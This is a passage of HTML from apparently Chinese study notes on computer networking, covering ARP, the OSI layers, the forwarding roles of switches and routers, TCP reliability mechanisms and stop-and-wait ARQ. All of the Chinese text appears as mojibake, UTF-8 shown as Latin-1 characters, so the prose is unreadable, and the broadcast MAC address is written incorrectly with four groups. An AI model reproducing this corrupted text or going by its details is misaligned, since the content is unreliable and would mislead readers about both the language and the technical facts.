<li><p>ä¸»æœºAé¦–å…ˆæŸ¥çœ‹è‡ªå·±çš„ARPè¡¨ï¼Œç¡®å®šå…¶ä¸­æ˜¯å¦åŒ…å«æœ‰ä¸»æœºBå¯¹åº”çš„ARPè¡¨é¡¹ã€‚å¦‚æœæ‰¾åˆ°äº†å¯¹åº”çš„MACåœ°å€ï¼Œåˆ™ä¸»æœºAç›´æ¥åˆ©ç”¨ARPè¡¨ä¸­çš„MACåœ°å€ï¼Œå¯¹IPæ•°æ®åŒ…è¿›è¡Œå¸§å°è£…ï¼Œå¹¶å°†æ•°æ®åŒ…å‘é€ç»™ä¸»æœºBã€‚ </p>
</li>
<li><p>å¦‚æœä¸»æœºAåœ¨ARPè¡¨ä¸­æ‰¾ä¸åˆ°å¯¹åº”çš„MACåœ°å€ï¼Œåˆ™å°†ç¼“å­˜è¯¥æ•°æ®æŠ¥æ–‡ï¼Œç„¶åä»¥å¹¿æ’­æ–¹å¼å‘é€ä¸€ä¸ªARPè¯·æ±‚æŠ¥æ–‡ã€‚ARPè¯·æ±‚æŠ¥æ–‡ä¸­çš„å‘é€ç«¯IPåœ°å€å’Œå‘é€ç«¯MACåœ°å€ä¸ºä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€ï¼Œç›®æ ‡IPåœ°å€å’Œç›®æ ‡MACåœ°å€ä¸ºä¸»æœºBçš„IPåœ°å€å’Œå…¨0çš„MACåœ°å€ã€‚ç”±äºARPè¯·æ±‚æŠ¥æ–‡ä»¥å¹¿æ’­æ–¹å¼å‘é€ï¼Œè¯¥ç½‘æ®µä¸Šçš„æ‰€æœ‰ä¸»æœºéƒ½å¯ä»¥æ¥æ”¶åˆ°è¯¥è¯·æ±‚ï¼Œä½†åªæœ‰è¢«è¯·æ±‚çš„ä¸»æœºï¼ˆå³ä¸»æœºBï¼‰ä¼šå¯¹è¯¥è¯·æ±‚è¿›è¡Œå¤„ç†ã€‚</p>
</li>
<li><p>ä¸»æœºBæ¯”è¾ƒè‡ªå·±çš„IPåœ°å€å’ŒARPè¯·æ±‚æŠ¥æ–‡ä¸­çš„ç›®æ ‡IPåœ°å€ï¼Œå½“ä¸¤è€…ç›¸åŒæ—¶è¿›è¡Œå¦‚ä¸‹å¤„ç†ï¼šå°†ARPè¯·æ±‚æŠ¥æ–‡ä¸­çš„å‘é€ç«¯ï¼ˆå³ä¸»æœºAï¼‰çš„IPåœ°å€å’ŒMACåœ°å€å­˜å…¥è‡ªå·±çš„ARPè¡¨ä¸­ã€‚ä¹‹åä»¥<strong>å•æ’­</strong>æ–¹å¼å‘é€ARPå“åº”æŠ¥æ–‡ç»™ä¸»æœºAï¼Œå…¶ä¸­åŒ…å«äº†è‡ªå·±çš„MACåœ°å€ã€‚</p>
</li>
<li><p>ä¸»æœºAæ”¶åˆ°ARPå“åº”æŠ¥æ–‡åï¼Œå°†ä¸»æœºBçš„MACåœ°å€åŠ å…¥åˆ°è‡ªå·±çš„ARPè¡¨ä¸­ä»¥ç”¨äºåç»­æŠ¥æ–‡çš„è½¬å‘ï¼ŒåŒæ—¶å°†IPæ•°æ®åŒ…è¿›è¡Œå°è£…åå‘é€å‡ºå»ã€‚ </p>
</li>
<li><p>å½“ä¸»æœºAå’Œä¸»æœºBä¸åœ¨ä¸€ä¸ªç½‘æ®µæ—¶ï¼Œä¸»æœºAå°±ä¼šå…ˆå‘ç½‘å…³å‘å‡ºARPè¯·æ±‚ï¼ŒARPè¯·æ±‚æŠ¥æ–‡ä¸­çš„ç›®æ ‡IPåœ°å€ä¸ºç½‘å…³çš„IPåœ°å€ã€‚å½“ä¸»æœºAä»æ”¶åˆ°çš„å“åº”æŠ¥æ–‡ä¸­è·å¾—ç½‘å…³çš„MACåœ°å€åï¼Œå°†æŠ¥æ–‡å°è£…å¹¶å‘ç»™ç½‘å…³ã€‚å¦‚æœç½‘å…³æ²¡æœ‰ä¸»æœºBçš„ARPè¡¨é¡¹ï¼Œç½‘å…³ä¼šå¹¿æ’­ARPè¯·æ±‚ï¼Œç›®æ ‡IPåœ°å€ä¸ºä¸»æœºBçš„IPåœ°å€ï¼Œå½“ç½‘å…³ä»æ”¶åˆ°çš„å“åº”æŠ¥æ–‡ä¸­è·å¾—ä¸»æœºBçš„MACåœ°å€åï¼Œå°±å¯ä»¥å°†æŠ¥æ–‡å‘ç»™ä¸»æœºBï¼›å¦‚æœç½‘å…³å·²ç»æœ‰ä¸»æœºBçš„ARPè¡¨é¡¹ï¼Œç½‘å…³ç›´æ¥æŠŠæŠ¥æ–‡å‘ç»™ä¸»æœºBã€‚ æœªçŸ¥ç›®çš„MACçš„æ—¶å€™ï¼Œç›®çš„Macå¯ä»¥æ˜¯ï¼šffff.ffff.ffff.ffff</p>
</li>
</ul>
<h3 id="å•è‡‚è·¯ç”±"><a href="#å•è‡‚è·¯ç”±" class="headerlink" title="å•è‡‚è·¯ç”±"></a>å•è‡‚è·¯ç”±</h3><p>ä¸€ä¸ªç½‘å¡å¯ä»¥é€šå‘ä¸¤ä¸ªç½‘ç»œ</p>
<h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>socketæ˜¯ä¸€ä¸ª4å…ƒç»„, ç”¨4å…ƒç»„æè¿°;</p>
<p>å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨80ç«¯å£èƒ½æœ‰65535ä¸ª, è¿æ¥90ä¹Ÿæœ‰65535ä¸ª, å¦‚æœå®¢æˆ·ç«¯æœ‰å¥½å‡ ä¸ªipåœ°å€å°±èƒ½å¯ä»¥å®ç°ç™¾ä¸‡è¿æ¥</p>
<h2 id="OSIä¸ƒå±‚"><a href="#OSIä¸ƒå±‚" class="headerlink" title="OSIä¸ƒå±‚"></a>OSIä¸ƒå±‚</h2><p>ç‰©è”ç½‘è‹æ±‡è¯•ç”¨</p>
<h3 id="åº”ç”¨å±‚"><a href="#åº”ç”¨å±‚" class="headerlink" title="åº”ç”¨å±‚"></a>åº”ç”¨å±‚</h3><p> é€šè¿‡åº”ç”¨è¿›ç¨‹çš„åŠäº¤äº’æ¥å®Œæˆç‰¹å®šç½‘ç»œåº”ç”¨; åº”ç”¨è¿›ç¨‹é—´çš„é€šä¿¡å’Œäº¤äº’è§„åˆ™; ä¸åŒçš„ç½‘ç»œåº”ç”¨éœ€è¦ä¸ç”¨çš„åº”ç”¨åè®®, DNS,HTTP,SMTP; åº”ç”¨å±‚äº¤äº’çš„æ•°æ®å•å…ƒç§°ä¸ºæŠ¥æ–‡</p>
<h3 id="ä¼ è¾“å±‚"><a href="#ä¼ è¾“å±‚" class="headerlink" title="ä¼ è¾“å±‚"></a>ä¼ è¾“å±‚</h3><p>è´Ÿè´£å‘ä¸¤å°ä¸»æœºè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡æä¾›é€šç”¨çš„æ•°æ®ä¼ è¾“æœåŠ¡; åº”ç”¨è¿›ç¨‹åˆ©ç”¨è¯¥æœåŠ¡ä¼ é€åº”ç”¨å±‚æŠ¥æ–‡; é€šç”¨æ˜¯æŒ‡å¤šç§åº”ç”¨å¯ä»¥ä½¿ç”¨åŒä¸€ä¸ªè¿è¾“å±‚æœåŠ¡; </p>
<p>ç”±äºä¸€å°ä¸»æœºå¯åŒæ—¶è¿è¡Œå¤šä¸ªçº¿ç¨‹ï¼Œå› æ­¤è¿è¾“å±‚æœ‰å¤ç”¨å’Œåˆ†ç”¨çš„åŠŸèƒ½ã€‚æ‰€è°“å¤ç”¨å°±æ˜¯æŒ‡å¤šä¸ªåº”ç”¨å±‚è¿›ç¨‹å¯åŒæ—¶ä½¿ç”¨ä¸‹é¢è¿è¾“å±‚çš„æœåŠ¡ï¼Œåˆ†ç”¨å’Œå¤ç”¨ç›¸åï¼Œæ˜¯è¿è¾“å±‚æŠŠæ”¶åˆ°çš„ä¿¡æ¯åˆ†åˆ«äº¤ä»˜ä¸Šé¢åº”ç”¨å±‚ä¸­çš„ç›¸åº”è¿›ç¨‹ã€‚</p>
<h3 id="ç½‘ç»œå±‚"><a href="#ç½‘ç»œå±‚" class="headerlink" title="ç½‘ç»œå±‚"></a>ç½‘ç»œå±‚</h3><p>åœ¨è®¡ç®—æœºç½‘ç»œä¸­è¿›è¡Œé€šè¡Œçš„ä¸¤ä¸ªè®¡ç®—æœºä¹‹é—´å¯èƒ½ä¼šç»è¿‡å¤šä¸ªæ•°æ®é“¾è·¯, ä¹Ÿèƒ½ä¼šç»è¿‡å¤šä¸ªé€šä¿¡å­ç½‘, ç½‘ç»œå±‚çš„ä»»åŠ¡å°±ä¼šé€‰æ‹©åˆé€‚çš„ç½‘é—´è·¯ç”±å’Œäº¤æ¢èŠ‚ç‚¹; åœ¨å‘é€æ•°æ®æ—¶, ç½‘ç»œå±‚æŠŠè¿è¾“å±‚å‚ç”Ÿçš„æŠ¥æ–‡æ®µæˆ–ç”¨æˆ·æ•°æ®æŠ¥å°è£…æˆåˆ†ç»„å’ŒåŒ…è¿›è¡Œä¼ é€; åœ¨TCP&#x2F;IPåè®®ä¸­, ç”±äºç½‘ç»œå±‚ä½¿ç”¨ipåè®®, å› æ­¤åˆ†ç»„ä¹Ÿå«IPæ•°æ®åŒ…, ç®€ç§°æ•°æ®æŠ¥;</p>
<h3 id="æ•°æ®é“¾è·¯å±‚"><a href="#æ•°æ®é“¾è·¯å±‚" class="headerlink" title="æ•°æ®é“¾è·¯å±‚"></a>æ•°æ®é“¾è·¯å±‚</h3><p><strong>æ•°æ®é“¾è·¯å±‚(data link layer)é€šå¸¸ç®€ç§°ä¸ºé“¾è·¯å±‚ã€‚ä¸¤å°ä¸»æœºä¹‹é—´çš„æ•°æ®ä¼ è¾“ï¼Œæ€»æ˜¯åœ¨ä¸€æ®µä¸€æ®µçš„é“¾è·¯ä¸Šä¼ é€çš„ï¼Œè¿™å°±éœ€è¦ä½¿ç”¨ä¸“é—¨çš„é“¾è·¯å±‚çš„åè®®ã€‚</strong> åœ¨ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹ä¹‹é—´ä¼ é€æ•°æ®æ—¶ï¼Œ<strong>æ•°æ®é“¾è·¯å±‚å°†ç½‘ç»œå±‚äº¤ä¸‹æ¥çš„ IP æ•°æ®æŠ¥ç»„è£…æˆå¸§</strong>ï¼Œåœ¨ä¸¤ä¸ªç›¸é‚»èŠ‚ç‚¹é—´çš„é“¾è·¯ä¸Šä¼ é€å¸§ã€‚æ¯ä¸€å¸§åŒ…æ‹¬æ•°æ®å’Œå¿…è¦çš„æ§åˆ¶ä¿¡æ¯ï¼ˆå¦‚åŒæ­¥ä¿¡æ¯ï¼Œåœ°å€ä¿¡æ¯ï¼Œå·®é”™æ§åˆ¶ç­‰ï¼‰ã€‚</p>
<p>åœ¨æ¥æ”¶æ•°æ®æ—¶ï¼Œæ§åˆ¶ä¿¡æ¯ä½¿æ¥æ”¶ç«¯èƒ½å¤ŸçŸ¥é“ä¸€ä¸ªå¸§ä»å“ªä¸ªæ¯”ç‰¹å¼€å§‹å’Œåˆ°å“ªä¸ªæ¯”ç‰¹ç»“æŸã€‚è¿™æ ·ï¼Œæ•°æ®é“¾è·¯å±‚åœ¨æ”¶åˆ°ä¸€ä¸ªå¸§åï¼Œå°±å¯ä»ä¸­æå‡ºæ•°æ®éƒ¨åˆ†ï¼Œä¸Šäº¤ç»™ç½‘ç»œå±‚ã€‚ æ§åˆ¶ä¿¡æ¯è¿˜ä½¿æ¥æ”¶ç«¯èƒ½å¤Ÿæ£€æµ‹åˆ°æ‰€æ”¶åˆ°çš„å¸§ä¸­æœ‰æ— å·®é”™ã€‚å¦‚æœå‘ç°å·®é”™ï¼Œæ•°æ®é“¾è·¯å±‚å°±ç®€å•åœ°ä¸¢å¼ƒè¿™ä¸ªå‡ºäº†å·®é”™çš„å¸§ï¼Œä»¥é¿å…ç»§ç»­åœ¨ç½‘ç»œä¸­ä¼ é€ä¸‹å»ç™½ç™½æµªè´¹ç½‘ç»œèµ„æºã€‚å¦‚æœéœ€è¦æ”¹æ­£æ•°æ®åœ¨é“¾è·¯å±‚ä¼ è¾“æ—¶å‡ºç°å·®é”™ï¼ˆè¿™å°±æ˜¯è¯´ï¼Œæ•°æ®é“¾è·¯å±‚ä¸ä»…è¦æ£€é”™ï¼Œè€Œä¸”è¿˜è¦çº é”™ï¼‰ï¼Œé‚£ä¹ˆå°±è¦é‡‡ç”¨å¯é æ€§ä¼ è¾“åè®®æ¥çº æ­£å‡ºç°çš„å·®é”™ã€‚è¿™ç§æ–¹æ³•ä¼šä½¿é“¾è·¯å±‚çš„åè®®å¤æ‚äº›ã€‚</p>
<h3 id="ç‰©ç†å±‚"><a href="#ç‰©ç†å±‚" class="headerlink" title="ç‰©ç†å±‚"></a>ç‰©ç†å±‚</h3><p>åœ¨ç‰©ç†å±‚ä¸Šæ‰€ä¼ é€çš„æ•°æ®å•ä½æ˜¯æ¯”ç‰¹ã€‚</p>
<p><strong>ç‰©ç†å±‚(physical layer)çš„ä½œç”¨æ˜¯å®ç°ç›¸é‚»è®¡ç®—æœºèŠ‚ç‚¹ä¹‹é—´æ¯”ç‰¹æµçš„é€æ˜ä¼ é€ï¼Œå°½å¯èƒ½å±è”½æ‰å…·ä½“ä¼ è¾“ä»‹è´¨å’Œç‰©ç†è®¾å¤‡çš„å·®å¼‚ï¼Œ</strong> ä½¿å…¶ä¸Šé¢çš„æ•°æ®é“¾è·¯å±‚ä¸å¿…è€ƒè™‘ç½‘ç»œçš„å…·ä½“ä¼ è¾“ä»‹è´¨æ˜¯ä»€ä¹ˆã€‚â€œé€æ˜ä¼ é€æ¯”ç‰¹æµâ€è¡¨ç¤ºç»å®é™…ç”µè·¯ä¼ é€åçš„æ¯”ç‰¹æµæ²¡æœ‰å‘ç”Ÿå˜åŒ–ï¼Œå¯¹ä¼ é€çš„æ¯”ç‰¹æµæ¥è¯´ï¼Œè¿™ä¸ªç”µè·¯å¥½åƒæ˜¯çœ‹ä¸è§çš„ã€‚</p>
<p>åœ¨äº’è”ç½‘ä½¿ç”¨çš„å„ç§åè®®ä¸­æœ€é‡è¦å’Œæœ€è‘—åçš„å°±æ˜¯ TCP&#x2F;IP ä¸¤ä¸ªåè®®ã€‚ç°åœ¨äººä»¬ç»å¸¸æåˆ°çš„TCP&#x2F;IPå¹¶ä¸ä¸€å®šå•æŒ‡TCPå’ŒIPè¿™ä¸¤ä¸ªå…·ä½“çš„åè®®ï¼Œè€Œå¾€å¾€è¡¨ç¤ºäº’è”ç½‘æ‰€ä½¿ç”¨çš„æ•´ä¸ªTCP&#x2F;IPåè®®æ—ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848265.png" alt="ä¸ƒå±‚ä½“ç³»ç»“æ„å›¾"></p>
<h2 id="æ•´ä¸ªä¼ è¾“è¿‡ç¨‹"><a href="#æ•´ä¸ªä¼ è¾“è¿‡ç¨‹" class="headerlink" title="æ•´ä¸ªä¼ è¾“è¿‡ç¨‹"></a>æ•´ä¸ªä¼ è¾“è¿‡ç¨‹</h2><h3 id="ç”µè„‘è§†è§’ï¼š"><a href="#ç”µè„‘è§†è§’ï¼š" class="headerlink" title="ç”µè„‘è§†è§’ï¼š"></a><strong>ç”µè„‘è§†è§’</strong>ï¼š</h3><ul>
<li>é¦–å…ˆæˆ‘è¦çŸ¥é“æˆ‘çš„ IP ä»¥åŠå¯¹æ–¹çš„ IP</li>
<li>é€šè¿‡å­ç½‘æ©ç åˆ¤æ–­æˆ‘ä»¬æ˜¯å¦åœ¨åŒä¸€ä¸ªå­ç½‘</li>
<li>åœ¨åŒä¸€ä¸ªå­ç½‘å°±é€šè¿‡ arp è·å–å¯¹æ–¹ mac åœ°å€ç›´æ¥æ‰”å‡ºå»</li>
<li>ä¸åœ¨åŒä¸€ä¸ªå­ç½‘å°±é€šè¿‡ arp è·å–é»˜è®¤ç½‘å…³çš„ mac åœ°å€ç›´æ¥æ‰”å‡ºå»</li>
</ul>
<h3 id="äº¤æ¢æœºè§†è§’ï¼š"><a href="#äº¤æ¢æœºè§†è§’ï¼š" class="headerlink" title="äº¤æ¢æœºè§†è§’ï¼š"></a><strong>äº¤æ¢æœºè§†è§’ï¼š</strong></h3><ul>
<li>æˆ‘æ”¶åˆ°çš„æ•°æ®åŒ…å¿…é¡»æœ‰ç›®æ ‡ MAC åœ°å€</li>
<li>é€šè¿‡ MAC åœ°å€è¡¨æŸ¥æ˜ å°„å…³ç³»</li>
<li>æŸ¥åˆ°äº†å°±æŒ‰ç…§æ˜ å°„å…³ç³»ä»æˆ‘çš„æŒ‡å®šç«¯å£å‘å‡ºå»</li>
<li>æŸ¥ä¸åˆ°å°±æ‰€æœ‰ç«¯å£éƒ½å‘å‡ºå»</li>
</ul>
<h3 id="è·¯ç”±å™¨è§†è§’ï¼š"><a href="#è·¯ç”±å™¨è§†è§’ï¼š" class="headerlink" title="è·¯ç”±å™¨è§†è§’ï¼š"></a><strong>è·¯ç”±å™¨è§†è§’ï¼š</strong></h3><ul>
<li>æˆ‘æ”¶åˆ°çš„æ•°æ®åŒ…å¿…é¡»æœ‰ç›®æ ‡ IP åœ°å€</li>
<li>é€šè¿‡è·¯ç”±è¡¨æŸ¥æ˜ å°„å…³ç³»</li>
<li>æŸ¥åˆ°äº†å°±æŒ‰ç…§æ˜ å°„å…³ç³»ä»æˆ‘çš„æŒ‡å®šç«¯å£å‘å‡ºå»ï¼ˆä¸åœ¨ä»»ä½•ä¸€ä¸ªå­ç½‘èŒƒå›´ï¼Œèµ°å…¶è·¯ç”±å™¨çš„é»˜è®¤ç½‘å…³ä¹Ÿæ˜¯æŸ¥åˆ°äº†ï¼‰</li>
<li>æŸ¥ä¸åˆ°åˆ™è¿”å›ä¸€ä¸ªè·¯ç”±ä¸å¯è¾¾çš„æ•°æ®åŒ…</li>
</ul>
<h2 id="TCPå’ŒUDPçš„åŒºåˆ«"><a href="#TCPå’ŒUDPçš„åŒºåˆ«" class="headerlink" title="TCPå’ŒUDPçš„åŒºåˆ«"></a>TCPå’ŒUDPçš„åŒºåˆ«</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848403.jpg" alt="TCPã€UDPåè®®çš„åŒºåˆ«"></p>
<h2 id="TCP-åè®®å¦‚ä½•ä¿è¯å¯é ä¼ è¾“"><a href="#TCP-åè®®å¦‚ä½•ä¿è¯å¯é ä¼ è¾“" class="headerlink" title="TCP åè®®å¦‚ä½•ä¿è¯å¯é ä¼ è¾“"></a>TCP åè®®å¦‚ä½•ä¿è¯å¯é ä¼ è¾“</h2><ol>
<li><p>åº”ç”¨æ•°æ®è¢«åˆ†å‰²æˆTCPè®¤ä¸ºæœ€é€‚åˆå‘é€çš„æ•°æ®å—ã€‚ </p>
</li>
<li><p>TCPç»™å‘é€çš„æ¯ä¸€ä¸ªåŒ…è¿›è¡Œç¼–å·ï¼Œæ¥æ”¶æ–¹å¯¹æ•°æ®åŒ…è¿›è¡Œæ’åºï¼ŒæŠŠæœ‰åºæ•°æ®ä¼ é€ç»™åº”ç”¨å±‚ã€‚ </p>
</li>
<li><p><strong>æ ¡éªŒå’Œï¼š</strong> TCPå°†ä¿æŒå®ƒé¦–éƒ¨å’Œæ•°æ®çš„æ£€éªŒå’Œã€‚è¿™æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„æ£€éªŒå’Œï¼Œç›®çš„æ˜¯æ£€æµ‹æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„ä»»ä½•å˜åŒ–ã€‚å¦‚æœæ”¶åˆ°æ®µçš„æ£€éªŒå’Œæœ‰å·®é”™ï¼ŒTCP å°†ä¸¢å¼ƒè¿™ä¸ªæŠ¥æ–‡æ®µå’Œä¸ç¡®è®¤æ”¶åˆ°æ­¤æŠ¥æ–‡æ®µã€‚ </p>
</li>
<li><p>TCP çš„æ¥æ”¶ç«¯ä¼šä¸¢å¼ƒé‡å¤çš„æ•°æ®ã€‚ </p>
</li>
<li><p><strong>æµé‡æ§åˆ¶ï¼š</strong> TCP è¿æ¥çš„æ¯ä¸€æ–¹éƒ½æœ‰å›ºå®šå¤§å°çš„ç¼“å†²ç©ºé—´ï¼ŒTCPçš„æ¥æ”¶ç«¯åªå…è®¸å‘é€ç«¯å‘é€æ¥æ”¶ç«¯ç¼“å†²åŒºèƒ½æ¥çº³çš„æ•°æ®ã€‚å½“æ¥æ”¶æ–¹æ¥ä¸åŠå¤„ç†å‘é€æ–¹çš„æ•°æ®ï¼Œèƒ½æç¤ºå‘é€æ–¹é™ä½å‘é€çš„é€Ÿç‡ï¼Œé˜²æ­¢åŒ…ä¸¢å¤±ã€‚TCP ä½¿ç”¨çš„æµé‡æ§åˆ¶åè®®æ˜¯å¯å˜å¤§å°çš„æ»‘åŠ¨çª—å£åè®®ã€‚ ï¼ˆTCP åˆ©ç”¨æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶ï¼‰</p>
</li>
<li><p><strong>æ‹¥å¡æ§åˆ¶ï¼š</strong> å½“ç½‘ç»œæ‹¥å¡æ—¶ï¼Œå‡å°‘æ•°æ®çš„å‘é€ã€‚(æ…¢å¼€å§‹,æ‹¥å¡é¿å…,å¿«é‡ä¼ ,å¿«æ¢å¤)</p>
<p>æ…¢å¼€å§‹:ç®€å•çš„è¯´,å¼€å§‹ä¼ è¾“æ—¶,ä¼ è¾“çš„æ•°æ®ç”±å°åˆ°å¤§é€’å¢åˆ°ä¸€ä¸ªå€¼(å³å‘é€çª—å£ç”±å°åˆ°å¤§(æŒ‡æ•°å¢é•¿)é€æ¸å¢å¤§åˆ°æ‹¥å¡çª—å£çš„æ•°å€¼).<br>æ‹¥å¡é¿å…:æ•°æ®å‘é€å‡ºå»,å¹¶æ”¶åˆ°æ¥æ”¶æ–¹å‘å›æ¥çš„ç¡®è®¤æ”¶åˆ°,æ‹¥å¡çª—å£æ¯æ¬¡å€¼åŠ 1åœ°çº¿æ€§å¢å¤§.<br>å¿«é‡ä¼ :æ•°æ®ä¼ è¾“æ—¶(æ•°æ®è¢«åˆ†æˆæŠ¥æ–‡,æ¯ä¸ªæŠ¥æ–‡éƒ½æœ‰ä¸ªåºå·),ä¸­é—´çš„ä¸€éƒ¨åˆ†ä¸¢å¤±æ¥æ”¶æ–¹æ²¡æ”¶åˆ°,æ¥æ”¶æ–¹è¿ç»­æ¥åˆ°åé¢çš„æ•°æ®,åˆ™å‘å›å¯¹ä¸¢å¤±å‰çš„æ•°æ®çš„é‡å¤ç¡®è®¤,è¿™æ ·å‘é€æ–¹å°±çŸ¥é“æœ‰éƒ¨åˆ†æ•°æ®ä¸¢å¤±äº†,äºæ˜¯ä»ä¸¢å¤±å¤„é‡ä¼ æ•°æ®.<br>å¿«æ¢å¤:å¿«æ¢å¤æ˜¯ä¸å¿«é‡ä¼ é…åˆçš„ç®—æ³•,åœ¨å‘ç”Ÿæ•°æ®ä¸¢å¤±æ—¶,å‘é€æ–¹æ”¶åˆ°æ¥æ”¶æ–¹å‘å›çš„ä¸‰ä¸ªé‡å¤ç¡®è®¤ä¿¡æ¯æ—¶,å°±æŠŠæ¯æ¬¡ä¼ è¾“çš„æ•°æ®é‡å‡ä¸ºåŸæ¥çš„ä¸€åŠ,æ‹¥å¡çª—å£ä¹Ÿä¿®æ”¹ä¸ºè¿™ä¸ªå€¼,ç„¶ååˆå¼€å§‹æ‹¥å¡é¿å…çš„ç®—æ³•.</p>
</li>
<li><p><strong>ARQåè®®ï¼š</strong> ä¹Ÿæ˜¯ä¸ºäº†å®ç°å¯é ä¼ è¾“çš„ï¼Œå®ƒçš„åŸºæœ¬åŸç†å°±æ˜¯æ¯å‘å®Œä¸€ä¸ªåˆ†ç»„å°±åœæ­¢å‘é€ï¼Œç­‰å¾…å¯¹æ–¹ç¡®è®¤ã€‚åœ¨æ”¶åˆ°ç¡®è®¤åå†å‘ä¸‹ä¸€ä¸ªåˆ†ç»„ã€‚</p>
</li>
<li><p><strong>è¶…æ—¶é‡ä¼ ï¼š</strong> å½“TCPå‘å‡ºä¸€ä¸ªæ®µåï¼Œå®ƒå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨ï¼Œç­‰å¾…ç›®çš„ç«¯ç¡®è®¤æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡æ®µã€‚å¦‚æœä¸èƒ½åŠæ—¶æ”¶åˆ°ä¸€ä¸ªç¡®è®¤ï¼Œå°†é‡å‘è¿™ä¸ªæŠ¥æ–‡æ®µã€‚</p>
</li>
</ol>
<h3 id="ARQåè®®"><a href="#ARQåè®®" class="headerlink" title="ARQåè®®"></a>ARQåè®®</h3><p><strong>è‡ªåŠ¨é‡ä¼ è¯·æ±‚</strong>ï¼ˆAutomatic Repeat-reQuestï¼ŒARQï¼‰æ˜¯OSIæ¨¡å‹ä¸­æ•°æ®é“¾è·¯å±‚å’Œä¼ è¾“å±‚çš„é”™è¯¯çº æ­£åè®®ä¹‹ä¸€ã€‚å®ƒé€šè¿‡ä½¿ç”¨ç¡®è®¤å’Œè¶…æ—¶è¿™ä¸¤ä¸ªæœºåˆ¶ï¼Œåœ¨ä¸å¯é æœåŠ¡çš„åŸºç¡€ä¸Šå®ç°å¯é çš„ä¿¡æ¯ä¼ è¾“ã€‚å¦‚æœå‘é€æ–¹åœ¨å‘é€åä¸€æ®µæ—¶é—´ä¹‹å†…æ²¡æœ‰æ”¶åˆ°ç¡®è®¤å¸§ï¼Œå®ƒé€šå¸¸ä¼šé‡æ–°å‘é€ã€‚ARQåŒ…æ‹¬åœæ­¢ç­‰å¾…ARQåè®®å’Œè¿ç»­ARQåè®®ã€‚</p>
<h4 id="åœæ­¢ç­‰å¾…ARQåè®®"><a href="#åœæ­¢ç­‰å¾…ARQåè®®" class="headerlink" title="åœæ­¢ç­‰å¾…ARQåè®®"></a>åœæ­¢ç­‰å¾…ARQåè®®</h4><p>åœæ­¢ç­‰å¾…åè®®æ˜¯ä¸ºäº†å®ç°å¯é ä¼ è¾“çš„ï¼Œå®ƒçš„åŸºæœ¬åŸç†å°±æ˜¯æ¯å‘å®Œä¸€ä¸ªåˆ†ç»„å°±åœæ­¢å‘é€ï¼Œç­‰å¾…å¯¹æ–¹ç¡®è®¤ï¼ˆå›å¤ACKï¼‰ã€‚å¦‚æœè¿‡äº†ä¸€æ®µæ—¶é—´ï¼ˆè¶…æ—¶æ—¶é—´åï¼‰ï¼Œè¿˜æ˜¯æ²¡æœ‰æ”¶åˆ° ACK ç¡®è®¤ï¼Œè¯´æ˜æ²¡æœ‰å‘é€æˆåŠŸï¼Œéœ€è¦é‡æ–°å‘é€ï¼Œç›´åˆ°æ”¶åˆ°ç¡®è®¤åå†å‘ä¸‹ä¸€ä¸ªåˆ†ç»„ã€‚</p>
<p>åœ¨åœæ­¢ç­‰å¾…åè®®ä¸­ï¼Œè‹¥æ¥æ”¶æ–¹æ”¶åˆ°é‡å¤åˆ†ç»„ï¼Œå°±ä¸¢å¼ƒè¯¥åˆ†ç»„ï¼Œä½†åŒæ—¶è¿˜è¦å‘é€ç¡®è®¤ã€‚</p>
<p><strong>ä¼˜ç¼ºç‚¹ï¼š</strong></p>
<ul>
<li><strong>ä¼˜ç‚¹ï¼š</strong> ç®€å•</li>
<li><strong>ç¼ºç‚¹ï¼š</strong> ä¿¡é“åˆ©ç”¨ç‡ä½ï¼Œç­‰å¾…æ—¶é—´é•¿</li>
</ul>
<p><strong>1) æ— å·®é”™æƒ…å†µ:</strong></p>
<p>å‘é€æ–¹å‘é€åˆ†ç»„,æ¥æ”¶æ–¹åœ¨è§„å®šæ—¶é—´å†…æ”¶åˆ°,å¹¶ä¸”å›å¤ç¡®è®¤.å‘é€æ–¹å†æ¬¡å‘é€ã€‚</p>
<p><strong>2) å‡ºç°å·®é”™æƒ…å†µï¼ˆè¶…æ—¶é‡ä¼ ï¼‰:</strong></p>
<p>åœæ­¢ç­‰å¾…åè®®ä¸­è¶…æ—¶é‡ä¼ æ˜¯æŒ‡åªè¦è¶…è¿‡ä¸€æ®µæ—¶é—´ä»ç„¶æ²¡æœ‰æ”¶åˆ°ç¡®è®¤ï¼Œå°±é‡ä¼ å‰é¢å‘é€è¿‡çš„åˆ†ç»„ï¼ˆè®¤ä¸ºåˆšæ‰å‘é€è¿‡çš„åˆ†ç»„ä¸¢å¤±äº†ï¼‰ã€‚å› æ­¤æ¯å‘é€å®Œä¸€ä¸ªåˆ†ç»„éœ€è¦è®¾ç½®ä¸€ä¸ªè¶…æ—¶è®¡æ—¶å™¨ï¼Œå…¶é‡ä¼ æ—¶é—´åº”æ¯”æ•°æ®åœ¨åˆ†ç»„ä¼ è¾“çš„å¹³å‡å¾€è¿”æ—¶é—´æ›´é•¿ä¸€äº›ã€‚è¿™ç§è‡ªåŠ¨é‡ä¼ æ–¹å¼å¸¸ç§°ä¸º <strong>è‡ªåŠ¨é‡ä¼ è¯·æ±‚ ARQ</strong> ã€‚å¦å¤–åœ¨åœæ­¢ç­‰å¾…åè®®ä¸­è‹¥æ”¶åˆ°é‡å¤åˆ†ç»„ï¼Œå°±ä¸¢å¼ƒè¯¥åˆ†ç»„ï¼Œä½†åŒæ—¶è¿˜è¦å‘é€ç¡®è®¤ã€‚<strong>è¿ç»­ ARQ åè®®</strong> 